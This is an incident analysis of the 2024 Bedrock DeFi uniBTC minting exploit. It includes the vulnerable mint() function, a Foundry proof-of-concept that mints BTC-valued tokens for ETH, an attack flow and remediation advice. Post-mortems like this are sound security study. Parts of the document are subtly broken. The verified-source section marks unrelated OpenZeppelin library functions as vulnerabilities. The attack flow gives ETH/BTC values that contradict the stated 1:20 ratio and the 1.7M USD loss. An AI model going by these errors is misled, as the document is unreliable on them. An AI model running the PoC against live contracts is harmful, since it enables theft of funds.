# Bedrock DeFi — ETH to uniBTC 1:1 Minting Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-26 |
| **Protocol** | Bedrock DeFi |
| **Chain** | Ethereum |
| **Loss** | ~1,700,000 USD |
| **Attacker** | [0x2bFB373017](https://etherscan.io/address/0x2bFB373017349820dda2Da8230E6b66739BE9F96) |
| **Attack Tx** | [0x725f0d65](https://etherscan.io/tx/0x725f0d65340c859e0f64e72ca8260220c526c3e0ccde530004160809f6177940) |
| **Vulnerable Contract** | [0x047D41F2](https://etherscan.io/address/0x047D41F2544B7F63A8e991aF2068a363d210d6Da) |
| **Root Cause** | The mint() function minted uniBTC at the same ratio regardless of whether ETH or WBTC was deposited |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bedrock_DeFi_exp.sol) |

---
## 1. Vulnerability Overview

Bedrock DeFi's `uniBTC` vault was originally designed to accept WBTC and mint uniBTC at a 1:1 ratio. However, the `mint()` function was also implemented to handle ETH (`msg.value`) without accounting for the price difference between ETH and WBTC (approximately 1:20), allowing an attacker to deposit 200 ETH and receive 200 uniBTC (≈ 200 BTC in value).

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable mint(): processes ETH and WBTC at the same ratio
// Implementation: 0x702696b2aa47fd1d4feaaf03ce273009dc47d901 L2417-2420
function mint() external payable {
    uint256 amount;
    if (msg.value > 0) {
        // ❌ Mints uniBTC 1:1 for ETH (ETH ≠ BTC price)
        amount = msg.value;  // 200 ETH → 200 uniBTC (200 BTC in value!)
    } else {
        // WBTC deposit handling
        amount = _depositWBTC();
    }
    IuniBTC(uniBTC).mint(msg.sender, amount);
}

// ✅ Fix: convert ETH → WBTC price equivalent before minting
// uint256 wbtcEquivalent = msg.value * ethPrice / btcPrice / 1e10;
// IuniBTC(uniBTC).mint(msg.sender, wbtcEquivalent);
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Address.sol
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {  // ❌ vulnerability
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
```

```solidity
// File: ERC1967Proxy.sol
contract ERC1967Proxy is Proxy, ERC1967Upgrade {
    /**
     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
     *
     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded
     * function call, and allows initializing the storage of the proxy like a Solidity constructor.
     */
    constructor(address _logic, bytes memory _data) payable {  // ❌ vulnerability
        _upgradeToAndCall(_logic, _data, false);
    }

    /**
     * @dev Returns the current implementation address.
     */
    function _implementation() internal view virtual override returns (address impl) {
        return ERC1967Upgrade._getImplementation();
    }
}
```

```solidity
// File: ERC1967Upgrade.sol
abstract contract ERC1967Upgrade is IERC1967 {
    // This is the keccak-256 hash of "eip1967.proxy.rollback" subtracted by 1
    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;

    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
     * validated in the constructor.
     */
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    /**
     * @dev Returns the current implementation address.
     */
    function _getImplementation() internal view returns (address) {  // ❌ vulnerability
        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
    }

    /**
     * @dev Stores a new address in the EIP1967 implementation slot.
     */
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
    }

    /**
     * @dev Perform implementation upgrade
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeTo(address newImplementation) internal {
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }

    /**
     * @dev Perform implementation upgrade with additional setup call.
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data,
        bool forceCall
    ) internal {
        _upgradeTo(newImplementation);
        if (data.length > 0 || forceCall) {
            Address.functionDelegateCall(newImplementation, data);
        }
```

## 3. Attack Flow

```
Attacker (minimal PoC for testing)
  │
  ├─[1]─▶ Prepare 200 ETH (or flash loan)
  │
  ├─[2]─▶ VulVault.mint{value: 200e18}()
  │         └─ ❌ 200 ETH → 200 uniBTC minted
  │             (Actual value: 200 ETH ≈ 0.05 BTC)
  │             (Minted uniBTC value: 200 BTC ≈ 14M USD)
  │
  ├─[3]─▶ 200 uniBTC → swap to WBTC via Uniswap
  │
  └─[4]─▶ ~1.7M USD profit realized
```

## 4. PoC Code

```solidity
// Minimal PoC: verify uniBTC minting ratio error with ETH
function testPoCMinimal() public {
    vm.deal(attacker, 200e18);  // fund 200 ETH

    vm.startPrank(attacker);
    // ❌ Depositing 200 ETH mints 200 uniBTC (= ~200 BTC in value)
    IFS(VulVault).mint{value: 200e18}();

    // Attacker holds 200 uniBTC (200 BTC acquired for 200 ETH invested)
    console.log("Final balance in uniBTC:", IFS(uniBTC).balanceOf(attacker));
    // Expected: 200_000_000_000_000_000_000 (200 * 1e18)
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Incorrect token price ratio |
| **Attack Vector** | Acquiring BTC-valued tokens using ETH |
| **CWE** | CWE-682: Incorrect Calculation |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **Disable ETH deposits**: Remove or explicitly block the `payable` functionality that accepts ETH
2. **Price conversion**: Convert ETH deposits using real-time ETH/BTC price before minting
3. **Price oracle integration**: Utilize Chainlink ETH/BTC price feed
4. **Unit tests**: Validate minting ratios with ETH deposit scenarios included

## 7. Lessons Learned

- Any `payable` function that accepts ETH while minting BTC-valued tokens must account for the price difference.
- Designs that treat different assets at a 1:1 ratio immediately invite arbitrage attacks when a price disparity exists.
- The $1.7M loss could have been prevented by a single line adding a price oracle to the ETH path of the `mint()` function.